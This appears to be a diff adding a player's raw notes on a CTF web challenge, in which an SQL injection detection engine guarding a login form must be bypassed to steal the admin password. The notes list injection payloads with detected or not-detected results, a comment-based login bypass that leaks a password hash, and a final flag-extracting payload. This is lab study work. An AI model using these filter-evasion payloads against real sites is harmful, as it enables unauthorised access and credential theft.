@@ -1,0 +1,109 @@
+Score: 200
+Type: web
+
+http://104.197.7.111:8080/
+
+geohot told me he has a lot of sql injection tricks. So I wrote a sql injection detection engine in defense.
+
+Now you have a simple website protected by my engine, try to steal the admin’s password(not hash).
+
+----
+form = web.input()
+
+username = form.get('username')
+password = form.get('password')
+
+if sqliengine.is_sqli(username):
+    raise web.BadRequest(u'username contains SQL injection, IP recorded.')
+
+if sqliengine.is_sqli(password):
+    raise web.BadRequest(u'password contains SQL injection, IP recorded')
+
+if sqliengine.is_sqli(username + password):
+    raise web.BadRequest(u'username + password contains SQL injection, IP recorded')
+
+# continue normal db operation
+----
+
+There are only two pages: login and register, please do not use web scanner to brute force, just do the sqli part.
+
+Solved by 123 teams
+
+
+----------------------------
+
+
+
+
+
+
+DETECTED
+admin' or '1' = '1
+admin') --
+
+
+ERROR
+admin' --
+
+
+
+ADMIN 				PASSWORD			DETECTED
+'-if()#									Y
+'-i()#									Y
+'-a()#									Y
+'-()#									N
+'-9()#									N
+'-^()#									N
+'a()#									N
+ 'if()#									N
+'=if()#									Y
+'=a()#									Y
+'=char(48)#								Y
+'char/**/(48)#							N
+'-a)#									Y
+'a)#									N
+'-a%29#									Y
+'-)#									N
+'-/**/)#								N
+'-a/*a*/)#								Y
+')#										Y
+')										Y
+admin'=1#								N
+admin'=0#								N
+)					p					Y
+)					'p					N
+a)										Y
+a(										Y
+a (										Y
+username=admin'#&password=p										
+										
+										
+										
+										
+
+
+
+What we can tell about the rules:
+- characters not blocked
+
+
+select * from users where username = 'admin' --' and password = 'p'
+insert into users (username, password) values ('admin' --', 'pass')
+
+MariaDB
+
+
+error executing sql: select * from users where username = 'admin' --' and password = 'p'
+(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'p'' at line 1")
+
+
+admin'#
+login success, id: 1, username: admin, password hash: c5475050ed61fd11bd10cb7f1ad7a729
+
+
+
+username=admin&password=p' or username='admin 		Y
+username=admin&password=p' or username='admin' ' 	N
+
+
+username=admin&password=p' or password = 'BCTF%7bh0w-d1d-y0u-fee1-l1ke-th3-sql1-eng1ne%7d' '
